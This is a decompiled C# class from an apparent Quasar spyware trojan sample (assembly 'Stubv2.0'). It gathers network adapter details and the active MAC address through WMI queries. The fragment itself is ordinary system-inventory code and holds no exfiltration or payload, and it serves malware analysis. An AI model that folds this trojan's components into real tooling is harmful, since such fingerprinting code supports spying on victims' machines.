// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.WMI.NetGatherer
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.WMI.Objects;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Data.WMI
{
  public static class NetGatherer
  {
    public static ICollection<NetworkAdapter> GetNetworkAdapter()
    {
      List<NetworkAdapter> networkAdapter1 = new List<NetworkAdapter>();
      WmiInstanceClassCollection instanceClassCollection = WmiInstance.Query("Win32_NetworkAdapterConfiguration", new string[4]
      {
        "Caption",
        "Description",
        "IPEnabled",
        "MacAddress"
      });
      if (instanceClassCollection == null)
        return (ICollection<NetworkAdapter>) networkAdapter1;
      foreach (WmiInstanceClass wmiInstanceClass in instanceClassCollection)
      {
        NetworkAdapter networkAdapter2 = new NetworkAdapter((string) wmiInstanceClass["Caption"].Value, (string) wmiInstanceClass["Description"].Value, (bool?) wmiInstanceClass["IPEnabled"].Value, (string) wmiInstanceClass["MACAddress"].Value);
        networkAdapter1.Add(networkAdapter2);
      }
      return (ICollection<NetworkAdapter>) networkAdapter1;
    }

    public static string GetActiveMacAddress() => WmiInstance.PropertyQuery<string>("Win32_NetworkAdapterConfiguration", "MACAddress", "IPEnabled = TRUE");
  }
}
